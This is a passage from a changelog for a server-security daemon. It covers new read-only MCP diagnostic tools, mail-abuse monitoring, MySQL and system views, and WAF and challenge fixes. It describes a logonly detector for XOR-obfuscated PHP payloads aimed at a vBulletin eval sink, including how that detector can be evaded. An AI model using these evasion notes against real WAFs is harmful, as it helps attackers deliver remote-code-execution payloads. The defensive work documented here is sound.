  timed with its parts split — `lock_wait` (contention on the backend mutex),
  `nl_work` (netlink add+flush — the shared connection's own health) and
  `cli_work` (the `nft` CLI portion) — kept in a small ring, plus the latest
  per-set feed write (element count, duration, error). The split is now also in
  the existing `[firewall] … EnsureBase` log line. Surfaced via
  `GET /api/v1/firewall/selftest` (admin-only) and the new `firewall_selftest`
  MCP tool. This is the live view for root-causing an nftlib node whose
  `EnsureBase` duration climbs over a run (rising `lock_wait` ⇒ a slow/failed feed
  write holding the mutex; rising `nl_work` ⇒ the netlink connection degrading) or
  a large feed that fails to apply (a set write erroring with "message too long").
  Instrumentation only — no change to enforcement behaviour; the exec-nft backend
  reports `available:false`. Brings the MCP tool set to 31.
- **MCP `whats_wrong` — one-call triage flagship.** A new read-only MCP tool that
  pulls the key signals together (health snapshot + health anomalies + systemd
  services + MySQL saturation + mail queue + mail-traffic anomalies) and returns a
  **severity-ranked** list of concrete problems — critical → warning → info — each
  with a one-line detail and the drill-down tool to call next (`process_list`,
  `service_status`, `mysql_pressure`, `mail_queue_summary`, `mail_traffic`, …). It
  flags disk/inode near-full, high sustained load, swap/conntrack pressure, a
  failed or flapping service, edge/frontend down or degraded, MySQL connections
  near max, a frozen mail-queue backlog, suspected outbound-mail spikes, and
  API-abuse bursts — and deliberately NOT routine activity (WAF hits, normal
  firewall blocks). A `sources` map reports which signals were read, unavailable
  (collector/governor off), or errored, so an unread signal is never mistaken for
  healthy. Reuses only existing allow-listed GET endpoints (read-only by
  construction); now the recommended MCP starting point ("is anything wrong right
  now?"). Brings the MCP tool set to 30.
- **Mail queue: "who filled the queue" per-sender attribution** — the mail-queue
  report (`mail_queue_summary` / the cfm-admin "Mail queue" page) now includes a
  `top_senders` list: queued messages attributed to the individual envelope
  sender with a **frozen / deferred** split (`<>` = null sender / bounce
  backscatter), not just by domain. Turns "the queue is backing up" into "sender
  X has 40 frozen messages" — the actionable culprit for a compromised account
  or a bounce storm. Aggregated by the existing exim/postfix queue parsers (no
  new probe); admin-only, like the rest of the queue report.
- **Mail Monitor: suspected-compromise anomaly detection** — `mail_traffic` /
  `GET /api/v1/mail/traffic` and the cfm-admin "Mail Monitor" page now carry an
  `anomalies` block: senders whose outbound in the last 2h is far above their
  OWN trailing 7-day baseline (`kind:"spike"`, with the ratio), plus
  never-before-seen senders suddenly blasting (`kind:"new-sender"`). This is the
  earliest compromised-account signal — it catches an account before it climbs
  the top-senders list, and a constant high-volume legitimate sender is NOT
  flagged (it's measured against itself). The baseline divisor uses the actual
  span of collected history, so a freshly-started collector doesn't over-flag.
  Scope-aware (a scoped cPanel viewer sees only its own senders); thresholds
  fixed in this version (ratio ≥3 and ≥20 recent, or ≥50 for a new sender).
- **Mail Monitor: outbound deliverability view** — `mail_traffic` / `GET /api/v1/mail/traffic`
  and the cfm-admin "Mail Monitor" page now carry a `deliverability` block: per
  remote provider (Gmail / Microsoft / Yahoo / …) **delivered / deferred /
  bounced** counts plus the **top defer/bounce reasons**, normalized into stable
  families (`spf-not-passed`, `unsolicited-rate-limited`, `unsolicited-blocked`,
  `over-quota`, `no-such-user`, `retry-backoff`, …). Answers "is our mail
  actually landing, and if not, why" — pair it with `mail_dns_check` for the
  DNS-side cause. The collector parses exim `=>`/`**`/`==` and postfix
  `status=sent|bounced|deferred` delivery lines (`internal/mailmeter`), storing
  per-hour `mail_delivery(provider, outcome, reason)` counters. Admin-only
  (delivery is host-wide, not per-tenant); deferred counts include exim retries.
- **MCP tool `mail_dns_check` + `GET /api/v1/mail/dns`** — the DNS half of a
  deliverability diagnosis (`internal/maildns`). Live TXT lookups for a domain's
  **SPF** (present? more than one? `all` qualifier? does it list the server's
  sending IP — best-effort via direct `ip4:`/`ip6:` mechanisms), **DMARC**
  (present? policy `p=`), **DKIM** (key at `<selector>._domainkey`), the sending
  IP's **PTR / forward-confirmed rDNS**, and **MX**, plus plain-language findings
  worst-first. Explains *why* Gmail returns `421-4.7.27 SPF did not pass` /
  `550 unsolicited` — a missing or misaligned SPF, no DMARC, or a bad PTR.
  Read-only; scope-aware (admins any domain, scoped cPanel viewers only their
  own). The evaluation logic is resolver-injected and unit-tested; includes an
  optional `dkim_selector` override.
- **cfm-admin WebUI: a "Mail Monitor" page** (`/cfm-admin/mailmon/`) — the Mail
  Monitor traffic view in the panel, alongside API + MCP. Window selector
  (1h…7d) over the per-hour counters, with top outbound senders, most-sent
  domains, top inbound mailboxes, local-script (PHP/cron) submitters by unix
  user, failed-login targets, rate-limited senders, over-quota mailboxes, and
  the whole-window totals. **Scope-aware:** admins see the whole server; a
  scoped cPanel viewer sees only its own domains, and the admin-only cards
  (local submitters, host-wide rejected) hide in scoped mode. Reads
  `GET /api/v1/mail/traffic` — the same data as the `mail_traffic` MCP tool, no
  per-request MTA probe.
- **Mail Monitor traffic collector + `mail_traffic` MCP tool + `GET /api/v1/mail/traffic`**
  — the stateful stage on top of the `mailmeter` leaf. A boot-time collector
  (`internal/mailtraffic`) tails the exim mainlog and the syslog maillog every
  minute and folds new lines into per-hour, per-mailbox counters in its own
  SQLite DB (`/var/lib/cfm/mailtraffic.db`); a read endpoint serves top outbound
  senders, most-sent domains, top inbound mailboxes, local-script (PHP/cron)
  submitters by unix user, and rejected/throttled/over-quota/failed-login
  tallies over a window (default 24h). This is the "who is sending a lot / which
  account is compromised" view, with NO per-request MTA probe (reads the
  persisted counters). **Scope-aware:** admins see the whole server; a scoped
  cPanel viewer sees only its own domains — host-wide and local-unix-user rows
  are admin-only by construction, fail-closed. Hourly buckets (not day-only) are
  stored deliberately, to unlock a later baseline-anomaly view. Tail positions
  persist (inode/offset), so a restart resumes without re-scanning history.
- **Mail Monitor foundation — `internal/mailmeter` (parser leaf)** — an
  MTA-agnostic, pure (no I/O, no clock) metering core that turns mail-server log
  lines into per-mailbox counters: outbound-by-sender, local-script submissions
  (Exim PHP/cron `sendmail`, keyed on the unix user — the dominant cPanel spam
  path), inbound-by-mailbox, over-quota, rate-limited (throttled), and
  failed-login tallies, correlating Postfix sends by queue-id and counting Exim
  authenticated `<=` submissions directly. Attacker-controlled failed-login
  usernames fold to a host-wide bucket so a password spray can't bloat the view. Groundwork for the coming "who is sending a lot / which account is
  compromised" view; no operator-facing surface yet (the tailing collector,
  persistence and MCP/API/WebUI reads land in a follow-up). Postfix+Dovecot
  parsing is ported from NGM's field-validated parser; Exim regexes are lifted
  verbatim from CFM's production `exim/relays` detector.
- **MCP tool `mail_log_tail` + `GET /api/v1/system/mail-log`** — bounded on-demand
  tail of a mail log (`which=exim` / `dovecot` / `postfix`), read-only, admin-only.
  The raw-log companion to `mail_queue_summary`: the exim mainlog is where
  outbound-abuse evidence lives — authenticated senders (grep `A=dovecot_login:`)
  and injecting scripts (grep `cwd=/home`) — which no other read tool exposed.
  Same cost discipline as `mysql_log_tail`: last N lines via `tail` (backward from
  EOF), timeout, optional case-insensitive grep, capped output, no continuous
  overhead; path resolved from a fixed per-service candidate list, never
  caller-supplied. `found:false` (not an error) when the service isn't logging at
  a known path. New `internal/maillog`.
- **cfm-admin WebUI: a "Mail queue" page** (`/cfm-admin/mail/`) — the mail-queue
  breakdown now in the panel too, closing the "everywhere" set (API + MCP + CLI +
  WebUI). Renders the detector-published report (total/frozen/deferred, age
  distribution, top sender + recipient domains, top defer/freeze reasons, oldest
  messages) — the same data as `cfm mailtop` / `mail_queue_summary`, no
  per-request MTA probe. Admin-only: the nav link hides for scoped viewers and
  the backend 403s. Shows a note when no queue detector is enabled yet.
- **MCP tool `ip_locate`** — the `cfm which/search <ip>` equivalent over MCP:
  where an IP is blocked across ALL sources (nft / cfm.deny / csf / fail2ban /
  imunify360) **and why**, since each hit carries the source's reason — notably
  the cfm.deny autoblock comment (e.g. `autoblock: portscan (N distinct ports) …
  at <time>`). This closes the attribution gap `firewall_blocks` + `detection_
  history` left: a permanent nft ban with no comment and no WAF/challenge event
  is explained here (portscan/detector autoblocks are written to cfm.deny, not
  the webdet history). Wraps the existing read-only `/search` endpoint; admin-only.
- **`cfm which` / `cfm search <IP>` now shows the "why / from where" too.** On
  top of the existing multi-source enforcement lookup (nft / cfm.deny / csf /
  fail2ban / imunify360, with set/feed/reason), for a single IP it appends a
  best-effort **CFM detection history** section — the WAF / challenge / autoblock
  events the daemon recorded for that IP, grouped by type+reason with counts and
  last-seen. This attributes a ban whose nft entry carries no comment: events →
  WAF/detector/challenge; **no events → a manual `cfm block` or an imported
  blocklist ban** (which is why it's permanent, unlike the 6h soft-TTL
  autoblocks). Best-effort over the local API — if the daemon isn't reachable the
  local lookup still stands and the section is marked unavailable. `--json`
  includes it under `detection_history`.
- **MCP `detection_history` tool now takes `ip=<addr>`** — attribute one source
  IP to the WAF/detector/challenge events CFM recorded for it ("who/why was this
  IP acted on?"). The `/api/v1/webdet/history/events` endpoint already filtered by
  IP (and the `cfm webtop history events --ip` CLI already used it); this just
  exposes it on the MCP tool, so a `firewall_blocks` ban that carries no nft
  comment can be traced to its origin (note: manual/blocklist bans leave no
  detection event, so an empty result there points to a manual/imported ban).
- **MCP tool `mail_queue_summary` + `GET /api/v1/system/mail-queue` —
  MTA-agnostic mail-queue breakdown.** Read-only, admin-only. On top of the raw
  queued/frozen counts already in the health snapshot, this gives the actionable
  view: total / frozen / deferred, an age distribution (<10m…>1d), the top
  sender + recipient domains, the oldest messages, **and the top deferral/freeze
  reasons** (normalized so hundreds of "retry time not reached for host X"
  collapse into one, alongside "Connection refused", 550 mailbox-not-found
  bounces, etc.) — the "why is mail backing up / who's flooding it / why are
  messages stuck?" view (a spike in one sender domain often means a compromised
  account or a bounce storm). **Detector-published, not per-request**: the active
  queue detector (`exim_queues`/`postfix_queues`) builds the report each poll
  from output it already has (plus a bounded mainlog tail for reasons) and
  publishes it to the new `internal/mailqueue` store; the API/CLI/WebUI read it
  with zero extra MTA probe. **Both exim and postfix are wired** — the postfix
  provider parses `postqueue -p` (with the defer reason carried inline in the
  listing, so no maillog tail is needed) and works for a plain postfix node or
  postfix-in-a-container (mailcow) via the detector's configurable list command
  (`docker exec … postqueue -p`). Exposed on the CLI as **`cfm mailtop`**
  (aliases `mail-queue`, `mailq`; `--json` for scripting); the same breakdown
  will also surface in the WebUI.
- **MCP tools `mysql_log_tail` + `mysql_slow_queries` + `GET /api/v1/system/mysql-log`
  — on-demand tails of the MySQL error / slow-query logs.** Read-only, admin-only.
  `mysql_log_tail` tails the MySQL/MariaDB **error log** (crashes, deadlocks,
  aborted connections, InnoDB errors, "too many connections"); `mysql_slow_queries`
  tails the **slow-query log** where enabled (the actual slow statements behind
  high MySQL CPU). The "MySQL pressure is high — what's erroring / what's slow?"
  companion to `mysql_pressure`. Bounded like the other log tails (last N lines
  via `tail`, timeout, optional case-insensitive grep, capped output); needs no DB
  connection — just the log files. The path is resolved from `my.cnf` +
  a fixed candidate list (never a caller-supplied path); a missing slow log is
  reported as `found:false` (likely disabled), not an error. New `internal/mysqllog`.
- **MCP tool `mysql_pressure` — the mysqltop view (per-user MySQL pressure).**
  Read-only. Composes the MySQL governor's `/api/v1/mysql/top` (connection
  saturation used/max/%, per-user connection load) with `/api/v1/mysql/cpu`
  (per-user CPU seconds, query count, avg latency), merges them by user and
  ranks by pressure (active connections → CPU → queries → total connections),
  capped to `top` (default 25). This is where you catch the offender — e.g. a
  user with few connections but high CPU/queries, or an account driving heavy
  MySQL load with little HTTP traffic. A `perf` block reports whether CPU
  numbers are actually available (performance_schema / MariaDB userstat); when
  off, cpu/query fields read 0.
- **MCP tool `ip_forensics` + `GET /api/v1/system/ip-forensics` — on-demand raw
  access-log lines for one source IP.** Read-only, admin-only. The correlation
  for an OLDER WAF hit that has aged out of `edge_access_tail`'s live ring:
  returns the raw edge access-log lines mentioning an IP, the equivalent of
  `tail -n N access.log | grep <ip>`. Cost-bounded by design — nothing runs
  until called, and a call reads only the last `lines` (default 300k, max 2M)
  via `tail` (backward from EOF, so a multi-GB log is never read whole), under a
  timeout, with a capped match set. The target log is auto-detected from a fixed
  allow-list of known edge access logs (OpenResty/Angie) — never a caller-
  supplied path. Complements `ip_drilldown` (in-memory aggregate: vhosts, rate,
  score) and `edge_access_tail` (right-now traffic).
- **MCP tool `edge_access_tail` + `GET /api/v1/webdet/access-recent` — recent
  edge access-log lines for WAF false-positive triage.** Read-only, **admin-only**
  (exposes requests across all vhosts). Returns the last requests (method, URI,
  status, bytes, response time, UA, referer), newest last, filterable by
  `ip`/`host`/`method`/`status` (exact `403` or class `4`)/`path` substring/
  `since` duration/`limit` (default 50, max 500). Pair it with a WAF hit (same
  `ip=`/`host=`) to see what the client was actually requesting around the
  trigger. Backed by a fixed-size in-memory ring at the log-ingest chokepoint
  (bounded memory regardless of traffic); per-field lengths are truncated and
  secret-looking query params (`token`, `password`, `api_key`, …) are redacted.
  Request bodies are never retained.

### Changed
- **`firewall_blocks` MCP tool is now summary-first with drill-down.** The nft
  ban list is often thousands of IPs, so returning it whole could blow an MCP
  client's response budget (a live node showed ~1000 bans / 110 KB). With no
  args the tool now returns a compact summary — total, permanent/temporary
  counts, top blocked countries (`by_country`) and top blocked networks
  (`by_asn`, GeoIP ASN + name). To see the actual bans, drill down with
  `country=<name>`, `asn=<number>`, and/or `reason=<comment substring>`; the
  drill-down returns the matching rows plus a within-facet ASN breakdown, so you
  can review one country's bans for false positives (a residential-ISP ASN is a
  likelier FP than a hosting/VPS network). Read-only; `GET /api/v1/firewall/list`
  (the WebUI's data source) is unchanged — the summarization is in the tool layer.
- **`security_overview` MCP tool is now compact.** It embedded the full
  firewall-block list (1000s of enriched rows) and the WAF summary's raw per-hit
  rows, so the "one-call headline" ballooned to hundreds of KB and could exceed
  an MCP client's response budget. It now keeps counts + top-N (firewall: a small
  row sample plus `rows_total`; WAF: the top rules/IPs/countries/histogram, raw
  hit rows dropped) and points to `firewall_blocks` / `waf_activity` for the full
  lists.
- **`listening_ports` / `GET /api/v1/system/listeners` now groups by (proto,
  port, process).** On a host that binds a service on many IP aliases (e.g.
  `named` on :53 across hundreds of addresses) the flat per-socket list was
  hundreds of near-identical rows (tens of KB — enough to blow the MCP response
  budget). Each group now carries the owning command + pid, a `count` of bind
  addresses and a bounded address sample (just the wildcard when it binds
  `0.0.0.0`/`::`). The response key is `groups` (was `listeners`).

### Fixed
- **postfix queue `total` / `frozen` counts are now accurate.** The
  `postfix_queues` detector counted the queue total with a line-counting shell
  command (`mailq | … | wc -l`), which over-counts ~3-5× because each message
  spans a header + optional reason + N recipient lines; and it derived "frozen"
  from the substring `"deferred"`, which `mailq` never prints (so the count was
  ~always 0). Both the health snapshot and the new mail-queue report now take
  the exact message count and the held-message count (postfix `!` marker)
  straight from the parsed listing — one probe, no line-counting — so the
  `QUEUE_TOTAL`/`QUEUE_FROZEN` alert thresholds finally mean what they say.
- **`mysql_slow_queries` no longer 502s on a long slow-log line.** A slow-query
  entry longer than the scanner buffer returned `bufio.Scanner: token too long`
  and failed the whole call. `internal/mysqllog` now uses a bounded
  `bufio.Reader`: an over-long line is truncated to the buffer prefix and the
  remainder drained to the next newline, so one monster query can neither blow
  memory nor abort the tail.
- **MySQL governor picks up a runtime `SET GLOBAL userstat=ON` without a cfm
  restart.** The capability probe ran once at startup and (while
  performance_schema was already OK) never re-evaluated userstat, so enabling
  userstat after the daemon started left the governor stuck on the query-only
  path — `mysql_pressure` kept reporting `userstat_off:true` with no CPU/busy
  data. `fetchPerfDeltas` now re-checks `@@userstat` on a 60s cadence while it's
  off and upgrades to the userstat path live (resetting the baseline so the
  first delta isn't a false spike).

### Changed
- **`mysql_pressure` surfaces `busy_sec` (+ `rows_read`) and ranks by it.** On
  many CloudLinux MariaDB builds `USER_STATISTICS.CPU_TIME` is 0 while
  `BUSY_TIME` (wall-clock busy time) is populated — the usable CPU proxy. The
  tool now exposes `busy_sec` per user and ranks active → cpu_sec → busy_sec →
  query volume, so the expensive tenant surfaces even when CPU_TIME reads 0.
- **`listening_ports` renders IPv6 link-local zones cleanly.** A zoned bind
  address (`[fe80::1]%eth0:53`) left a stray `]` mid-string
  (`fe80::1]%eth0`); the closing bracket is now dropped so the zone survives
  intact. Cosmetic — ports/owners were always correct.
- **`service_status` de-duplicates units that share a resolved systemd Id.**
  Alias query names (`mysql`/`mysqld` → `mariadb.service`, `lsws` →
  `lshttpd.service`) made `systemctl show` emit the same unit several times, so
  the tool reported `mariadb`/`lshttpd` two or three times. Blocks are now
  collapsed by resolved unit Id.

### Added
- **MCP tool `service_status` + `GET /api/v1/system/services` — systemd unit
  status.** Read-only, admin-only. For a curated CFM + hosting-stack set (cfm,
  edge, db, mail, dns, ftp, ssh, panel) — or an explicit `units=` list — reports
  each unit's load/active/enabled state, sub-state, main pid, memory, restart
  count and uptime. Answers "is cfm/the edge/mysql/mail actually running, and is
  anything flapping?". New `internal/svcstat` runs one `systemctl show` for the
  whole set; uptime is derived from the monotonic activation stamp against
  `/proc/uptime` (locale/timezone-independent). Not-installed units are elided
  from the default view but reported as `not-found` when named explicitly.
- **MCP tool `dmesg_tail` + `GET /api/v1/system/dmesg` — kernel ring buffer
  tail.** Read-only, admin-only. Returns the last N `dmesg -T` lines (default 80,
  max 1000) with an optional case-insensitive `grep` filter — OOM kills, I/O/disk
  errors, segfaults, nftables drops, hardware/driver messages. The "why did it
  OOM/crash/reset?" view the structured health snapshot can't surface. New
  `internal/kmsg` shells out to `dmesg -T` (bounded ring buffer, cheap — no
  filesystem walk); requires CAP_SYSLOG (the daemon runs privileged).
- **MCP tool `listening_ports` + `GET /api/v1/system/listeners` — listening
  sockets and their owning process.** Read-only, admin-only. The `ss -tlnp` view:
  proto (tcp/tcp6/udp/udp6), bind address, port, owning command name + pid, for
  every listening TCP/UDP socket, sorted by port. Answers "is the edge/daemon/
  panel actually listening, and who owns :443?". New `internal/netstat` shells
  out to iproute2's `ss` (already relied on by the health collector) rather than
  an O(pids×fds) /proc scan; returns bind address + owning COMM/pid only (no
  connections or peers).
- **MCP tool `process_list` + `GET /api/v1/system/processes` — the busiest
  processes on a node (top-like).** Read-only, admin-only. Returns pid, user,
  state, %cpu (short two-sample delta, one core ≈ 100%), %mem, rss, threads and
  the command **name** for the top-N processes (default 15, max 200), read
  straight from `/proc` (no external tools/cgo). The "system_health shows high
  load — which process is eating it, or are many stuck in D-state on I/O?"
  companion to the aggregate health snapshot. Security: exposes the process COMM
  only, never `/proc/<pid>/cmdline` (command-line args routinely carry secrets).
- **Persistent, process-wide PTR (reverse-DNS) cache backed by SQLite.** Resolved
  PTRs are now shared across every Enricher in the daemon (engine + all detectors
  + nflog + outbound) via a single on-disk store at `/var/lib/cfm/ptrcache.db`,
  behind each Enricher's in-memory cache. Two wins: (1) a PTR resolved by any
  component — a challenge-exclude check, WAF `top_ips`, a host/IP drilldown, a
  detector alert — is immediately available to all the others, so read views like
  `host_drilldown` almost always show the PTR instead of only after that
  component has seen the IP; (2) it survives a daemon restart/redeploy, so the box
  doesn't re-resolve every IP from cold. Reads are an indexed primary-key lookup
  on an in-memory miss; writes are async (never block enrichment); rows older than
  the 30-day TTL are pruned. Enabled only in the daemon (`EnablePersistentPTR`);
  the CLI and tests keep the pure in-memory behaviour. Best-effort — if the DB
  can't be opened, enrichment falls back to the per-Enricher in-memory caches.
- **Read-only MCP server (`/cfm-admin/mcp`) — read CFM's security telemetry from
  an MCP client (e.g. the claude.ai remote connector).** The daemon now embeds a
  read-only [Model Context Protocol](https://modelcontextprotocol.io) server,
  served through the existing OpenResty edge under `/cfm-admin/mcp` (no new port,
  no edge-config change). It exposes 15 read-only tools — WAF activity/rules,
  challenge vhosts/events, suspicious hosts, top talkers, hot IPs, host/IP
  drilldowns, detection history, top bots, firewall blocks, detector status,
  system health, and a one-call `security_overview` — each dispatching to the
  same `/api/v1` read handler the CLI/web UI use, in-process, GET-only,
  allow-listed (read-only by construction; no tool can block/exclude/configure).
  Auth uses a **dedicated `MCP_TOKEN`** (in `cfm.conf`), kept separate from the
  admin/API `AUTH_TOKEN` — MCP clients never see the admin token, which is used
  only for the in-process read dispatch. An OAuth 2.1 + PKCE flow (dynamic client
  registration, discovery via the 401 `resource_metadata` pointer) serves the
  claude.ai web connector — consent is approving with `MCP_TOKEN`, minting a
  read-only token that is inert against `/api/v1`; Claude Code / API clients may
  present `MCP_TOKEN` as a static `Authorization: Bearer` instead. The server is
  mounted only when `AUTH_TOKEN` is set AND `MCP_TOKEN` is set and ≥24 chars
  (a short/weak/missing `MCP_TOKEN` fails closed → server stays disabled);
  rotating `MCP_TOKEN` revokes all issued MCP tokens without touching `AUTH_TOKEN`.
  See `MCP.md` for the as-built map, arming steps, and roadmap. Code in
  `internal/mcpserver/`; tests cover the bearer gate, OAuth discovery/flow, tool
  dispatch, and the `MCP_TOKEN` strength gate. Hardened after adversarial +
  security review: OAuth authorization codes and refresh tokens are single-use
  (replay rejected / rotation with reuse detection), the consent page displays the
  redirect host and warns on a non-first-party client (anti-phishing on open
  dynamic client registration), the advertised scheme is trusted from
  `X-Forwarded-Proto` only via the loopback edge, and the in-process dispatch
  scrubs the admin token from any response body as defense-in-depth.
- **Challenge/WAF exclude add/remove is now logged to `cfm.log`.** Adding or
  removing a challenge- or WAF-exclude previously left no paper trail, yet an
  exclude silently governs whether the challenge/WAF layer runs for a host or
  path — so a challenge/protection "disappearing" could not be traced to an
  exclude change. Every add/remove now emits one `[exclude]` line with
  `action`, `kind` (challenge|waf), `type` (host|path), `value`, `scope`
  (`global` or the sorted host list), `rule_ids` (`all` or the WAF rule-id set),
  and `result` (`ok` = state changed, `noop` = already in that state / invalid).
  Logged at the `Engine.{Challenge,WAF}Exclude{Add,Remove}*` wrappers, the single
  choke point every source (HTTP API, CLI, WebUI) passes through; uses the
  existing `cfm.log` sink (no new log file). ClamAV scan/mode overrides keep
  their own `LogfCLAM` line and are unaffected. Test: `TestFormatExcludeChange`.
- **WAF: generic phpfuck / numeric-XOR obfuscation detector (rule 439,
  `WAF_BACKDOOR`, logonly).** Best-effort, technique-level visibility for a
  "phpfuck" payload — arbitrary PHP built entirely from XOR of parenthesised
  digit literals — aimed at restricted-charset `eval()` sinks such as vBulletin
  `runMaths()` (CVE-2026-61511) and similar. Fires when a request body carries a
  single contiguous `[0-9().^]` run (≥60 chars) with a storm of parens, XOR
  carets and concatenation dots together. Ships **logonly** and is deliberately
  kept there: it is body-only (misses GET-args delivery) and its tight run
  charset means no-op-operator / whitespace / letter interspersing evades — all
  acceptable for a visibility-only rule. The real defence against runMaths RCE
  is patching vBulletin (≥6.2.2).

### Changed
- **Release dating is now UTC and the `CHANGELOG` is stamped automatically.**
  All `make release` timestamps use `date -u` (UTC) so a build can't land on a
  different day depending on the build host's timezone; `VERSION`/tag keep a
  `-HHMMSS` UTC suffix while the CHANGELOG heading stays date-only
  (`YYYY.MM.DD`). `make release` now runs `scripts/stamp-changelog.sh`
  (`REL_DATE`, UTC) after building: it moves `## [Unreleased]` under a dated
  `## YYYY.MM.DD` heading and leaves a fresh empty `[Unreleased]` — no more
  hand-editing the date on release day (you still add bullets while working and
  commit the stamped file with the release). Idempotent: an empty `[Unreleased]`
  is a no-op and a second same-day build appends under the existing dated
  section. Also available standalone as `make changelog`. A new CI gate
  (`scripts/tests/stamp_changelog_test.sh`) covers the stamper, and CLAUDE.md §8
  is updated (and its stale "tag is `vYYYY.MM.DD`" note corrected — the tag
  actually carries the `-HHMMSS` suffix).

### Fixed
- **Challenge status list/summary: an expired manual vhost row no longer counts
  as active.** The ChalAPI store has no TTL sweeper for vhost rows, so a manual
  (or manual-kept) challenge whose TTL lapsed sat at `Status=active` with a past
  `ExpiresAt` until some later event rewrote that key — inflating the
  active-vhost count and the `status=active` list with challenges no longer in
  force. `Summary()` and `ListVhosts()` now filter on an effective-active check
  (`Status=active` AND `ExpiresAt` unset-or-future); auto rows (zero `ExpiresAt`,
  governed by the tick loop) are unaffected, and `status=all`/`inactive` views
  still surface the stale row. Tests:
  `TestChallengeAPIStore_ExpiredManualNotCountedActive`,
  `TestChallengeAPIStore_AutoActiveNotHiddenByZeroExpiry`.
- **An operator manual vhost challenge now wins over a challenge-exclude / an
  ignore-list match, and every `vhost_clear` records WHY.** The vhost gate's
  per-host clear paths (`challenge_rules.go`) called `ClearVhost` whenever a
  host matched `hostChallengeExcluded` or `ChallengeVHostIgnore` — tearing down
  an explicit operator manual challenge on that host, even though a
  challenge-exclude / ignore entry is only meant to govern *auto* challenges.
  Now those two paths keep and refresh the manual challenge when
  `manualChallengeCoversClear(host)` is true (honouring apex→www, so the `www`
  variant of an apex manual is kept too), via a shared
  `keepManualOverSuppression` helper that: refreshes the bridge entry with the
  host's **own** remaining TTL (`manualChallengeCovering`, not the cross-variant
  max — so a shorter-lived variant is not over-extended); re-grants the same
  per-IP bypasses the normal manual-push path grants (IGNORE_IPS + dynamic
  `chalExclude`); throttles its `kept_manual_over_exclude`/`kept_manual_over_ignore`
  log to once per holddown per host (so a candidate host doesn't spam the log
  every tick); and, when only a *sibling* variant carries the manual (e.g. an
  excluded apex whose `www` has it), keeps the sibling's entry without
  challenging the excluded host itself. The auto flag is still cleared so the
  display doesn't claim auto owns the row; in DNAT mode (no bridge) it clears
  the flag and stays silent rather than logging a keep it can't perform. The
  config-`CHALLENGE_VHOST` reconcile skips its clear too when a manual covers the
  pattern, avoiding a per-tick clear→re-push churn. **Bypass stays absolute** —
  `cfm.allow`/`hostBypassed` is the "never challenge this host" safety valve and
  still clears, but now logs (throttled) `manual_suppressed_by_bypass` so the
  override is visible instead of silent. Separately, `ClearVhost` now takes a
  `reason` and stamps it on the `nginx_bridge vhost_clear` log line (`auto_off` /
  `excluded` / `ignored` / `host_bypass` / `manual_off` / `cfg_*`) — a bare
  `vhost_clear` previously gave no way to tell an auto cool-down from an
  exclude/bypass/operator clear. Also tidies a pre-existing duplicate
  `ClearVhost` in the ignore branch. Finally, the auto cool-down (`offOK`) path
  no longer emits a `WEB/VHOST_CHALLENGE_OFF` "challenge lifted" alert (nor an
  `action=auto_off` log line) when a manual challenge still holds the vhost —
  only the auto flag turns off; the challenge did not lift. Tests:
  `TestManualWinsOverExcludeDecision`, `TestManualKeepSelfVsSiblingCoverage`,
  and end-to-end through the real tick (`emitIPChallenges`):
  `TestEmitIPChallenges_ManualKeptOverExclude`,
  `TestEmitIPChallenges_ExcludeClearsWhenNoManual`,
  `TestEmitIPChallenges_AutoCooldownKeepsManual_NoOffAlert` (with a negative
  control proving the OFF alert fires without the manual).
- **Challenge status list: a manually-challenged vhost no longer "drops from
  the list" when the auto scorer cools.** The ChalAPI vhost store
  (`challenge_api_store.go`) kept a single `Status`/`Mode` per host and recorded
  a manual challenge only under the exact host the operator named — the apex.
  The bridge, though, enforces an apex manual challenge on apex **and** `www`
  (`vhostVariantsForBridge`), so the `www` row carried only auto records; when
  `challenge_suspicious_vhost` cooled below `score_off`,
  `RecordVhostAuto(host,false)` flipped `www` to `Status=inactive`/`Mode=auto`
  while the challenge was still being served, so it vanished from the
  active/manual list view and the active-vhost count — enforcement intact,
  reporting wrong (observed on `www.e-vafeiadis.gr`, 2026-08-05, where the
  operator re-issued the still-active challenge because the list showed it
  gone). Now `RecordVhostManual` mirrors the apex→www expansion (both rows show
  manual/active), and an active manual challenge outranks the auto scorer in the
  store: neither `auto_on` nor `auto_off` overwrites the manual top-line
  (`Status`/`Mode`/`ExpiresAt`), surfacing the auto action via
  `LastAction=auto_on_under_manual`/`auto_off_keep_manual` and still recording
  the auto score/uniqIP/rps as evidence. Reporting-only (a companion to the
  enforcement fix in the manual-vs-auto lifecycle work); no API/JSON shape
  change — the manual-coverage marker is unexported. The
  `GET /api/v1/challenge/vhost/status` endpoint now resolves `manual_active`
  via `manualChallengeCovering` (not exact-key), so querying the `www` variant
  of an apex manual challenge correctly reports it active. Tests:
  `TestChallengeAPIStore_ManualCoversWWWacrossAutoCycle`,
  `TestChallengeAPIStore_AutoOffAppliesAfterManualCleared`,
  `TestHandleChallengeVhostStatus_WWWCoveredByApexManual`.
- **WAF: stop rule 402 (`WAF_UPLOAD_CONTENT:UPLOAD_PHP_TAG`) from blocking the
  String Locator plugin's file editor.** String Locator is an in-browser
  theme/plugin file editor: on Save it POSTs the entire PHP file being edited to
  `/wp-json/string-locator/v1/save`, whose `<?php` opener tripped the upload
  content scanner and 403'd the request (and, because `UPLOAD_CONTENT` is
  autoblock-armed, fed a 6h `waf_security` nft ban) — a real authenticated admin
  editing their own theme. Added the plugin's REST namespace
  (`^/wp-json/string-locator/`) to `is_known_legit_php_upload_endpoint`, which on
  that namespace stands down the body-PHP scanner set — upload rules 401/402/403
  plus the 431-436 and 439 `WAF_BACKDOOR` body detectors, the same treatment as
  the installer / Code Snippets; every URI-based rule still runs. Safe to
  allowlist in code — unlike the WMW migration FP,
  which stays an operator-side exclude — because it is keyed on a fixed REST
  *path* (not a body-overridable admin-ajax action) over an endpoint that keeps
  its own downstream capability check. See docs/waf.md FP case 7.

### Removed
- **WAF: dropped the prototyped block-tier vBulletin `runMaths()` CVE rule
  (CVE-2026-61511, was rule 10015) — never released.** A route-anchored,
  autoblock-armed version was built and put through three adversarial review
  rounds, then removed as too dangerous for a forum-hosting fleet: an ordinary
  *spaced* math forum post (`(1.5)^2 + (2.5)^2 + …`) is form-urlencoded with
  spaces as `+`, which `normalize` does not restore to spaces, so the phpfuck
  signature merged it into one run and **false-positive-banned a real user**
  (6h nft ban) on the `ajax/render` preview route. The FP fix and the
  evasion-resistance fix are mutually exclusive, and a benign math post is
  indistinguishable from the attack at request time — so no safe enforcement
  rule exists at this endpoint. Only the logonly detector above remains.

### Changed
- **Enricher: PTR reverse-DNS split into its own 30-day cache (geo stays 24h).**
  PTR is the only expensive enrich field (a blocking reverse-DNS) and an IP's
